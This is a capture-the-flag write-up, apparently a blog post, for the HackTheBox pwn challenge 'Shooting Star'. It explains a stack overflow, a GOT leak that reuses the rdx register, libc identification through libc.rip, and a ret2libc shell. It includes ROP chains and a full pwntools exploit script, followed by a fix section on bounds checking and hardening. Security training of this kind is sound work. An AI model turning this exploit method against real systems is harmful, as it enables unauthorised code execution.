---
layout: post
title: "HTB Challenge: Shooting Star"
date: 2027-07-26 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, ret2libc, rop, got-leak, rdx-inheritance, libc-identification, pwntools, aslr-bypass, no-pie]
---

## Overview

**Shooting Star** is an Easy HTB Pwn challenge. A 64-bit binary with NX but no PIE, no stack canary, and Partial RELRO presents a single-stage menu: choose option `1` to make a wish, which internally calls `read(0, buf, 0x200)` into a 64-byte stack buffer — a classic [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html). The key trick is that the binary itself calls `write(1, "May your wish come true!\n", 26)` immediately before the function epilogue, leaving `rdx = 26` in the register. A ROP chain can inherit that value for free to leak three contiguous GOT entries in one call, identify the remote glibc via the `libc.rip` API, and call `system("/bin/sh")` on the second overflow.

---

## The Technique

### Stage 1 — GOT leak via inherited rdx

The `star()` function structure in pseudo-C:

```c
void star() {
    char wish[64];
    read(0, wish, 0x200);                         // overflow: 72 bytes to ret addr
    write(1, "May your wish come true!\n", 26);   // sets rdx = 26
    // leave; ret  →  attacker controls rip
}
```

Overflow offset = 64 (buffer) + 8 (saved rbp) = **72 bytes**.

After `write()` returns, `rdx` holds `26`. The `leave; ret` epilogue pops our ROP chain off the stack with `rdx` already set. A call to `write@plt(rdi=1, rsi=got["write"], rdx_inherited=26)` therefore leaks **26 bytes of contiguous GOT** — enough to read the runtime addresses of `write`, `read`, and `setvbuf` — with no need for a separate gadget to control `rdx`.

ROP chain for stage 1:

```
[72 × 'A']          ← fill buf + saved rbp
[pop rdi; ret]      ← 0x4012cb
[1]                 ← stdout fd
[pop rsi; pop r15; ret]  ← 0x4012c9
[got["write"]]      ← address of write's GOT entry
[0]                 ← r15 (dummy)
[ret]               ← 0x4012cc (stack alignment, also used below)
[write@plt]         ← write(1, got["write"], 26)
[main]              ← return to main for a fresh overflow
```

### Stage 2 — Remote libc identification via libc.rip

The low 12 bits of any GOT pointer are ASLR-invariant (they encode the offset within a mapped page). Three 12-bit values — `write & 0xfff`, `read & 0xfff`, `setvbuf & 0xfff` — uniquely fingerprint the glibc build. A POST to `https://libc.rip/api/find` returns the exact library ID and every symbol offset, including `system` and `str_bin_sh`. No local copy of libc is needed.

```python
matches = requests.post(
    "https://libc.rip/api/find",
    json={"symbols": {
        "write":   hex(w & 0xfff),
        "read":    hex(r & 0xfff),
        "setvbuf": hex(s & 0xfff),
    }},
).json()
# → libc6_2.27-3ubuntu1.4_amd64
```

### Stage 3 — system("/bin/sh")

With `libc_base = write_addr − write_offset`, compute `system` and the `/bin/sh` string address, then send a second overflow:

```
[72 × 'A']
[ret]               ← 0x4012cc  (rsp alignment: rsp % 16 must be 8 at system's entry)
[pop rdi; ret]      ← 0x4012cb
[/bin/sh address]
[system]
```

The `ret` pad shifts `rsp` by 8, ensuring glibc's internal `movaps` (SSE alignment check) does not crash `system()`.

### Drain bug — don't consume the banner

After collecting the 24-byte GOT leak with `p.recvn(24)`, drain only the remaining 2 bytes (`p.recv(2, timeout=2)`) — **not** the full main() banner. If the banner is consumed by a broad `recv(4096, ...)`, the stage-3 `recvuntil(b"> ")` call blocks forever: the binary has already printed the banner and is waiting at `read(choice)`, so no new `>` prompt will arrive.

---

## Solution

```python
#!/usr/bin/env python3
"""
HTB - Shooting Star (Easy Pwn, retired)
BOF: read(0, rbp-0x40, 0x200) when choice == '1'; buf=64B, no canary, no PIE, NX.
"""
import sys
sys.stdout.reconfigure(line_buffering=True)
from pwn import *
import requests

HOST = "{{rhost}}"
PORT = {{port}}

elf = ELF("./files/shooting_star", checksec=False)
context.arch = "amd64"
context.log_level = "warning"

OFFSET      = 72        # 64B buf + 8B saved rbp
pop_rdi     = 0x4012cb  # pop rdi; ret
pop_rsi_r15 = 0x4012c9  # pop rsi; pop r15; ret
ret_ga      = 0x4012cc  # ret  (stack-alignment gadget)


def send_overflow(p, rop_bytes):
    p.recvuntil(b"> ")
    p.send(b"1")
    p.recvuntil(b">> ")
    p.send(rop_bytes.ljust(0x200, b"\x00"))
    p.recvuntil(b"May your wish come true!\n")


def exploit():
    p = remote(HOST, PORT)

    # Stage 1 — leak GOT via write() with inherited rdx=0x1a=26
    rop1 = flat([
        b"A" * OFFSET,
        pop_rdi,     1,
        pop_rsi_r15, elf.got["write"], 0,
        ret_ga,
        elf.plt["write"],
        elf.sym["main"],
    ])
    send_overflow(p, rop1)
    raw = p.recvn(24, timeout=5)
    p.recv(2, timeout=2)          # drain 2 leftover GOT bytes; NOT the banner
    w, r, s = u64(raw[0:8]), u64(raw[8:16]), u64(raw[16:24])

    # Stage 2 — identify libc from 12-bit page offsets
    matches = requests.post(
        "https://libc.rip/api/find",
        json={"symbols": {
            "write":   hex(w & 0xfff),
            "read":    hex(r & 0xfff),
            "setvbuf": hex(s & 0xfff),
        }},
        timeout=10,
    ).json()
    best      = matches[0]
    syms      = best["symbols"]
    write_off  = int(syms["write"],   16)
    system_off = int(syms["system"],  16)
    binsh_off  = int(syms.get("str_bin_sh", syms.get("/bin/sh", "0")), 16)
    libc_base  = w - write_off
    system     = libc_base + system_off
    binsh      = libc_base + binsh_off

    # Stage 3 — system("/bin/sh")
    rop3 = flat([b"A" * OFFSET, ret_ga, pop_rdi, binsh, system])
    send_overflow(p, rop3)
    p.sendline(b"cat /home/ctf/flag.txt")
    p.sendline(b"exit")
    print(p.recvall(timeout=8).decode(errors="replace"))


if __name__ == "__main__":
    exploit()
```

Flag: `HTB{...}`

---

## Why It Worked

The binary called `write(1, string, 26)` immediately before `leave; ret`, leaving `rdx = 26` visible to the ROP chain. Without PIE or a stack canary, the overflow directly controlled the return address, and the inherited `rdx` eliminated the need for a gadget to set the third argument. Because three consecutive GOT entries (write/read/setvbuf) land within that 26-byte window, a single `write@plt` call leaks enough data to uniquely identify the remote glibc build via `libc.rip` — no local libc copy required.

The [stack-based buffer overflow](https://cwe.mitre.org/data/definitions/121.html) itself is [CWE-121](https://cwe.mitre.org/data/definitions/121.html): `read(0, buf, 0x200)` with `sizeof(buf) = 64` writes up to 512 bytes into a 64-byte allocation, overwriting the saved frame pointer and return address on the stack.

---

## Fix / Defense

```c
void star() {
    char wish[64];
    read(0, wish, sizeof(wish));   // exact bound — no overflow
    write(1, "May your wish come true!\n", 26);
}
```

Compile with: `-fstack-protector-strong -pie -z relro -z now`

- **Stack canary** (`-fstack-protector-strong`) terminates the process on overflow before `ret`.
- **PIE** randomizes the binary's own load address, eliminating fixed-address gadgets.
- **Full RELRO** (`-z relro -z now`) makes the GOT read-only at startup, preventing GOT overwrites and making leaked GOT values less actionable.
